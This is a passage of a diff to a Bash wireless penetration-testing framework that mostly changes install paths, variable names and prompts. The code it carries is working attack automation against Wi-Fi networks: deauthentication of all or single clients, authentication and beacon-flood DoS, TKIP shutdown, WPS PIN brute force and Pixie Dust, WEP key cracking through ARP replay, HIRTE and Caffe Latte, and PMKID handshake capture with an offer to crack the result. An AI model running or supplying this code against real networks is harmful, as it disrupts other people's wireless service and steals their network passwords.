-    aireplay-ng -0 ${packets_to_send} -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null # add "-D" to avoid errors
+    aireplay-ng -0 ${frames_to_send} -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null # add "-D" to avoid errors
   else
     echo
-    aireplay-ng -0 ${packets_to_send} -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF ${netCard} 2>/dev/null # add "-D" to avoid errors
+    aireplay-ng -0 ${frames_to_send} -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF ${netCard} 2>/dev/null # add "-D" to avoid errors
   fi
 
   if [ "${c_h}" == "true" ]; then # Enter here is user wants to capture handshakes
@@ -2373,7 +2437,7 @@ function deauth_all_clients(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   ask_to_crack_handshakes
 
   if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
@@ -2393,10 +2457,10 @@ function deauth_one_client(){
     color_output "*" "Escaneando dispositivos, no cierres la ventana de airodump-ng..."
   fi
 
-  if [ "$kill_network_services" == "true" ]; then
-    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} --bssid ${ap_bssid} -w \"/opt/wef/cache/airodump-devices\" ${netCard}" 2>/dev/null &
+  if [ "$airmon_check_kill" == "true" ]; then
+    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} --bssid ${ap_bssid} -w \"/usr/share/wef/cache/airodump-devices\" ${netCard}" 2>/dev/null &
   else
-    airodump-ng -c ${channel} --bssid ${ap_bssid} -w "/opt/wef/cache/airodump-devices" ${netCard} 2>/dev/null &
+    airodump-ng -c ${channel} --bssid ${ap_bssid} -w "/usr/share/wef/cache/airodump-devices" ${netCard} 2>/dev/null &
   fi
   airodump_PID=$!
 
@@ -2417,7 +2481,7 @@ function deauth_one_client(){
     return
   fi
 
-  clients="$(cat /opt/wef/cache/airodump-devices-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)"
+  clients="$(cat /usr/share/wef/cache/airodump-devices-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)"
   clients_length="$(echo "${clients}" | wc -l)"
 
   if [[ $client_number -le $clients_length ]]; then
@@ -2433,13 +2497,15 @@ function deauth_one_client(){
   fi
 
   default="10"
-  ask_packets
-  if [ "$packets_to_send" == "back" ]; then
+  ask_frames
+  if [ "$frames_to_send" == "back" ]; then
     reset_info
     return
   fi; sleep 0.1
 
   ask_to_capture_handshakes
+
+  sleep 0.9
 
   clear
   log_attack_info
@@ -2448,16 +2514,16 @@ function deauth_one_client(){
 
   iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl+C para pararlo"
   fi
 
   if [ "$verbose" == "false" ]; then
-    aireplay-ng -0 ${packets_to_send} -a ${ap_bssid} -c ${client_mac} ${netCard} &>/dev/null
+    aireplay-ng -0 ${frames_to_send} -a ${ap_bssid} -c ${client_mac} ${netCard} &>/dev/null
   else
     echo
-    aireplay-ng -0 ${packets_to_send} -a ${ap_bssid} -c ${client_mac} ${netCard} 2>/dev/null
+    aireplay-ng -0 ${frames_to_send} -a ${ap_bssid} -c ${client_mac} ${netCard} 2>/dev/null
   fi
 
   if [ "${c_h}" == "true" ]; then
@@ -2476,7 +2542,7 @@ function deauth_one_client(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   ask_to_crack_handshakes
 
   if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
@@ -2492,6 +2558,7 @@ function deauth_one_client(){
 # WIDS Confusion attack (mdk4)
 function wids_confusion_attack(){
   clear
+  color_output_ln "*" "In this attack, you can cross-connect clients to multiple WDS nodes or fake rogue APs to confuse the access point"
   scan_aps
   log_back_to_menu
 
@@ -2508,9 +2575,9 @@ function wids_confusion_attack(){
   fi
 
   if [ "$lang" == "en" ]; then
-    color_output_no_line "*" "Do you want to activate the Zero_Chaos' WIDS exploit? (default=no) [${yC}y${blueC}/${yC}n${blueC}]: " && read zero_chaos
+    color_output_no_line "*" "Do you want to activate the Zero_Chaos' WIDS exploit? (default=no) (${yC}yes${blueC}/${yC}no${blueC}): " && read zero_chaos
   else
-    color_output_no_line "*" "Quieres activar el exploit de WIDS Zero_Chaos? (por defecto=no) [${yC}s${blueC}/${yC}n${blueC}]: " && read zero_chaos
+    color_output_no_line "*" "Quieres activar el exploit de WIDS Zero_Chaos? (por defecto=no) (${yC}si${blueC}/${yC}no${blueC}): " && read zero_chaos
   fi
 
   if [ "$zero_chaos" == "y" ] || [ "$zero_chaos" == "yes" ] || [ "$zero_chaos" == "s" ] || [ "$zero_chaos" == "si" ]; then
@@ -2524,9 +2591,9 @@ function wids_confusion_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting WIDS Confusion attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting WIDS Confusion attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque de Confusión WIDS, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque de Confusión WIDS, presiona Ctrl+C para pararlo"
   fi
 
   if [ "$zero_chaos" != "true" ] && [ "$verbose" == "false" ]; then
@@ -2545,7 +2612,7 @@ function wids_confusion_attack(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   reset_info
   keep_exit
 }
@@ -2553,6 +2620,7 @@ function wids_confusion_attack(){
 # Authentication DoS attack (mdk4)
 function authentication_attack(){
   clear
+  color_output_ln "*" "In this attack, authentication frames are sent to the access point trying to overload it, causing it to freeze or reset sometimes"
   scan_aps # Scan nearby APs
   log_back_to_menu
 
@@ -2572,16 +2640,22 @@ function authentication_attack(){
     return
   fi
 
-  check_and_create "/opt/wef/main/captures/${essid}"
+  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+    ap_dir="${essid}-${ap_bssid}"
+  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+    ap_dir="${ap_bssid}"
+  fi
+
+  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
 
   clear
   log_attack_info
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting Authentication DoS attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting Authentication DoS attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque de Autenticación DoS, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque de Autenticación DoS, presiona Ctrl+C para pararlo"
   fi
 
   iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
@@ -2614,7 +2688,7 @@ function authentication_attack(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   reset_info
   keep_exit
 }
@@ -2622,6 +2696,7 @@ function authentication_attack(){
 # Beacon Flood attack (mdk4)
 function beacon_flood_attack(){
   clear
+  color_output_ln "*" "In this attack, a lot of beacon frames are sent to create fake access points, this may disrupt the availability of a wireless network"
   scan_aps # Scan nearby APs
   log_back_to_menu
 
@@ -2655,9 +2730,9 @@ function beacon_flood_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting Beacon Flood attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting Beacon Flood attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque Beacon Flood, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque Beacon Flood, presiona Ctrl+C para pararlo"
   fi
 
   iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
@@ -2684,7 +2759,7 @@ function beacon_flood_attack(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   reset_info
   keep_exit
 }
@@ -2692,6 +2767,7 @@ function beacon_flood_attack(){
 # TKIP (Michael Shutdown Exploitation) attack (mdk4)
 function tkip_attack(){
   clear
+  color_output_ln "*" "In this attack, random or duplicate packets are sent to different QoS queues which can trigger Michael Countermeasures on TKIP access points, leading to a one-minute AP shutdown"
   scan_aps # Scan nearby APs
   log_back_to_menu
 
@@ -2712,9 +2788,9 @@ function tkip_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting TKIP (Michael Shutdown Exploitation) attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting TKIP (Michael Shutdown Exploitation) attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque TKIP (Michael Shutdown Exploitation), presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque TKIP (Michael Shutdown Exploitation), presiona Ctrl+C para pararlo"
   fi
 
   if [ "$verbose" == "false" ]; then
@@ -2731,7 +2807,7 @@ function tkip_attack(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   reset_info
   keep_exit
 }
@@ -2744,6 +2820,7 @@ function tkip_attack(){
 # WPS Pixie Dust attack (reaver)
 function pixie_dust_attack(){
   clear
+  color_output_ln "*" "This attack tries to figure out the WPS PIN by discovering the two main key nonces so that the WPA password can be found"
   scan_aps_wps # Scan nearby APs
   log_back_to_menu
 
@@ -2764,9 +2841,9 @@ function pixie_dust_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting Pixie Dust attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting Pixie Dust attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque Pixie Dust, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque Pixie Dust, presiona Ctrl+C para pararlo"
   fi
 
   if [ "$verbose" == "false" ]; then
@@ -2796,6 +2873,7 @@ function pixie_dust_attack(){
 # WPS PIN Bruteforce attack (reaver)
 function pin_bruteforce_attack(){
   clear
+  color_output_ln "*" "This attack tries to bruteforce the WPS PIN so that the WPA password can be discovered"
   scan_aps_wps # Scan nearby APs
   log_back_to_menu
 
@@ -2816,9 +2894,9 @@ function pin_bruteforce_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting PIN bruteforce attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting PIN bruteforce attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque de fuerza bruta de PIN, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque de fuerza bruta de PIN, presiona Ctrl+C para pararlo"
   fi
 
   if [ "$verbose" == "false" ]; then
@@ -2848,6 +2926,7 @@ function pin_bruteforce_attack(){
 # Null Pin attack (reaver)
 function null_pin_attack(){
   clear
+  color_output_ln "*" "This attack sends a null PIN to check if the access point receives it as a valid PIN so that the WPA password can be discovered"
   scan_aps_wps # Scan nearby APs
   log_back_to_menu
 
@@ -2868,9 +2947,9 @@ function null_pin_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting Null Pin attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting Null Pin attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque de Pin nulo, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque de Pin nulo, presiona Ctrl+C para pararlo"
   fi
 
   # Perform attack
@@ -2897,6 +2976,7 @@ function null_pin_attack(){
 # ARP Replay attack (aireplay-ng)
 function arp_replay_attack(){
   clear
+  color_output_ln "*" "This attack consists in sending tons of ARP packets to capture enough IVs to crack the WEP key"
   scan_aps # Scan nearby APs
   log_back_to_menu
 
@@ -2906,7 +2986,13 @@ function arp_replay_attack(){
   fi
   parse_info
 
-  check_and_create "/opt/wef/main/captures/${essid}"
+  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+    ap_dir="${essid}-${ap_bssid}"
+  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+    ap_dir="${ap_bssid}"
+  fi
+
+  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
   ask_to_capture_ivs
 
   default="5m"
@@ -2920,9 +3006,9 @@ function arp_replay_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting Replay attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting Replay attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque de Replay, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque de Replay, presiona Ctrl+C para pararlo"
   fi
 
   if [ "$verbose" == "false" ]; then
@@ -2947,7 +3033,7 @@ function arp_replay_attack(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   reset_info
   keep_exit
 }
@@ -2955,6 +3041,7 @@ function arp_replay_attack(){
 # HIRTE attack (aireplay-ng)
 function hirte_attack(){
   clear
+  color_output_ln "*" "This attack combines the fragmentation attack and the caffe latte attack to crack the WEP key"
   scan_aps # Scan nearby APs
   log_back_to_menu
 
@@ -2964,7 +3051,13 @@ function hirte_attack(){
   fi
   parse_info
 
-  check_and_create "/opt/wef/main/captures/${essid}"
+  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+    ap_dir="${essid}-${ap_bssid}"
+  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+    ap_dir="${ap_bssid}"
+  fi
+
+  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
   ask_to_capture_ivs
 
   default="5m"
@@ -2978,9 +3071,9 @@ function hirte_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting HIRTE attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting HIRTE attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque HIRTE, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque HIRTE, presiona Ctrl+C para pararlo"
   fi
 
   if [ "$verbose" == "false" ]; then
@@ -3006,7 +3099,7 @@ function hirte_attack(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   reset_info
   keep_exit
 }
@@ -3014,6 +3107,7 @@ function hirte_attack(){
 # Caffe Latte attack (aireplay-ng)
 function caffe_latte_attack(){
   clear
+  color_output_ln "*" "The Cafe Latte attack allows you to obtain a WEP key from a client system, this is done by capturing an ARP packet, manipulating it and then send it back to the client"
   scan_aps # Scan nearby APs
   log_back_to_menu
   
@@ -3023,7 +3117,13 @@ function caffe_latte_attack(){
   fi
   parse_info
 
-  check_and_create "/opt/wef/main/captures/${essid}"
+  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+    ap_dir="${essid}-${ap_bssid}"
+  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+    ap_dir="${ap_bssid}"
+  fi
+
+  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
   ask_to_capture_ivs
 
   default="5m"
@@ -3037,9 +3137,9 @@ function caffe_latte_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting Caffe Latte attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting Caffe Latte attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque Caffe Latte, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque Caffe Latte, presiona Ctrl+C para pararlo"
   fi
 
   if [ "$verbose" == "false" ]; then
@@ -3067,7 +3167,7 @@ function caffe_latte_attack(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   reset_info
   keep_exit
 }
@@ -3075,6 +3175,7 @@ function caffe_latte_attack(){
 # Fake Authentication attack (aireplay-ng)
 function fake_authentication_attack(){
   clear
+  color_output_ln "*" "This attack creates fake devices to make the access point generate new IVs so that the WEP key can be discovered"
   scan_aps # Scan nearby APs
   log_back_to_menu
   
@@ -3084,7 +3185,13 @@ function fake_authentication_attack(){
   fi
   parse_info
 
-  check_and_create "/opt/wef/main/captures/${essid}"
+  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+    ap_dir="${essid}-${ap_bssid}"
+  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+    ap_dir="${ap_bssid}"
+  fi
+
+  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
   ask_to_capture_ivs
 
   default="5m"
@@ -3098,9 +3205,9 @@ function fake_authentication_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting Fake Authentication attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting Fake Authentication attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque de autenticación falsa, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque de autenticación falsa, presiona Ctrl+C para pararlo"
   fi
 
   echo
@@ -3126,7 +3233,7 @@ function fake_authentication_attack(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
   reset_info
   keep_exit
 }
@@ -3139,6 +3246,7 @@ function fake_authentication_attack(){
 # Passive WPA Capture attack (airodump-ng)
 function passive_capture_attack(){
   clear
+  color_output_ln "*" "This attack tries to capture network packets constantly in order to catch a handshake of a device connecting to the access point"
   scan_aps # Scan nearby APs
   log_back_to_menu
 
@@ -3159,18 +3267,24 @@ function passive_capture_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting passive WPA handshake capture attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting passive WPA handshake capture attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque pasivo de captura de handshake WPA, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque pasivo de captura de handshake WPA, presiona Ctrl+C para pararlo"
   fi
 
-  check_and_create "/opt/wef/main/captures/${essid}"
+  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+    ap_dir="${essid}-${ap_bssid}"
+  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+    ap_dir="${ap_bssid}"
+  fi
+
+  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
   cap_name=$(date +"%Y-%m-%d-%H-%M-%S")
 
-  if [ "${kill_network_services}" == "true" ]; then
-    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry -10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"/opt/wef/main/captures/${essid}/${cap_name}\" --bssid \"${ap_bssid}\" ${netCard}" 2>/dev/null & # Escape double quotes to avoid errors
+  if [ "${airmon_check_kill}" == "true" ]; then
+    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry -10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\" --bssid \"${ap_bssid}\" ${netCard}" 2>/dev/null & # Escape double quotes to avoid errors
   else
-    airodump-ng -c ${channel} -w "/opt/wef/main/captures/${essid}/${cap_name}" --bssid "${ap_bssid}" ${netCard} &
+    airodump-ng -c ${channel} -w "/usr/share/wef/main/captures/${ap_dir}/${cap_name}" --bssid "${ap_bssid}" ${netCard} &
   fi
   passive_PID=$!
 
@@ -3184,7 +3298,7 @@ function passive_capture_attack(){
 
   log_completed
   log_capture_files
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
 
   c_h="true"
   ask_to_crack_handshakes
@@ -3202,6 +3316,7 @@ function passive_capture_attack(){
 # PMKID attack (hcxtools)
 function pmkid_attack(){
   clear
+  color_output_ln "*" "This attack attempts to catch the PMKID handshake of an access point. This is a clientless attack"
   scan_aps # Scan nearby APs
   log_back_to_menu
 
@@ -3232,15 +3347,21 @@ function pmkid_attack(){
   press_enter_attack
   echo
   if [ "$lang" == "en" ]; then
-    progress_bar 2 0.2 "*" "Starting PMKID attack, press Ctrl + C to stop it"
+    progress_bar 2 0.2 "*" "Starting PMKID attack, press Ctrl+C to stop it"
   else
-    progress_bar 2 0.2 "*" "Comenzando ataque PMKID, presiona Ctrl + C para pararlo"
+    progress_bar 2 0.2 "*" "Comenzando ataque PMKID, presiona Ctrl+C para pararlo"
   fi
 
-  check_and_create "/opt/wef/main/captures/${essid}"
+  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
+    ap_dir="${essid}-${ap_bssid}"
+  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
+    ap_dir="${ap_bssid}"
+  fi
+
+  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
 
   file_date="$(date +"%Y-%m-%d-%H-%M-%S")"
-  hcxdumptool -i ${oldCard} -c ${pmkid_channel} -w "/opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng" | grep -v "bye-bye" &
+  hcxdumptool -i ${oldCard} -c ${pmkid_channel} -w "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng" | grep -v "bye-bye" &
   hcx_PID=$!
   sleep "${attack_time}"
   kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null
@@ -3249,22 +3370,22 @@ function pmkid_attack(){
   if [ ! "${ctrl_c_pressed}" ]; then
     echo
     if [ "$lang" == "en" ]; then
-      color_output "*" "Extracting hashes from /opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng"
+      color_output "*" "Extracting hashes from /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng"
     else
-      color_output "*" "Extrayendo hashes de /opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng"
+      color_output "*" "Extrayendo hashes de /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng"
     fi
     sleep 1.2 # Let the user read
 
     if [ "$verbose" == "false" ]; then
-      hcxpcapngtool -o "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt" "/opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng" &>/dev/null
+      hcxpcapngtool -o "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt" "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng" &>/dev/null
     elif [ "$verbose" == "true" ]; then
       echo
-      hcxpcapngtool -o "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt" "/opt/wef/main/captures/${essid}/${file_date}_pmkid.pcapng"
+      hcxpcapngtool -o "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt" "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng"
     fi; sleep 1
   fi
 
   if [ ! "${ctrl_c_pressed}" ]; then
-    if [ -f "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt" ]; then
+    if [ -f "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt" ]; then
       if [ "$lang" == "en" ]; then
         progress_bar 2 0.2 "*" "Filtering target AP hashes"
       else
@@ -3272,9 +3393,9 @@ function pmkid_attack(){
       fi
 
       if [ "$verbose" == "false" ]; then
-        hcxhashtool -o "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" --type=1 --mac-ap=${ap_bssid} -i "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt" &>/dev/null
+        hcxhashtool -o "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" --type=1 --mac-ap=${ap_bssid} -i "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt" &>/dev/null
       elif [ "$verbose" == "true" ]; then
-        hcxhashtool -o "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" --type=1 --mac-ap=${ap_bssid} -i "/opt/wef/main/captures/${essid}/${file_date}_pmkid_mixed_handshakes.txt"
+        hcxhashtool -o "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" --type=1 --mac-ap=${ap_bssid} -i "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt"
       fi; sleep 0.2
     fi
   fi
@@ -3287,17 +3408,17 @@ function pmkid_attack(){
 
   write_informative_log
   log_completed
-  create_graph "/opt/wef/cache/airodump-01.csv" "/opt/wef/main/graphs/${cap_name}.png"
+  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
 
-  if [ -f "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" ]; then
+  if [ -f "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" ]; then
     if [ "$lang" == "en" ]; then
-      handshake_total=$(wc -l "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" | awk '{print $1}')
-      color_output "*" "${handshake_total} handshakes written to /opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt"
-      color_output_no_line "*" "Do you want to crack the PMKID handshakes? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+      handshake_total=$(wc -l "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" | awk '{print $1}')
+      color_output "*" "${handshake_total} handshakes written to /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt"
+      color_output_no_line "*" "Do you want to crack the PMKID handshakes? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
     else
-      handshake_total=$(wc -l "/opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt" | awk '{print $1}')
-      color_output "*" "${handshake_total} handshakes almacenados en /opt/wef/main/captures/${essid}/${file_date}_pmkid_filtered_handshakes.txt"
-      color_output_no_line "*" "¿Quieres crackear los handshakes PMKID? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
+      handshake_total=$(wc -l "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" | awk '{print $1}')
+      color_output "*" "${handshake_total} handshakes almacenados en /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt"
+      color_output_no_line "*" "¿Quieres crackear los handshakes PMKID? (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
     fi
 
   else
@@ -3309,7 +3430,7 @@ function pmkid_attack(){
   fi
   
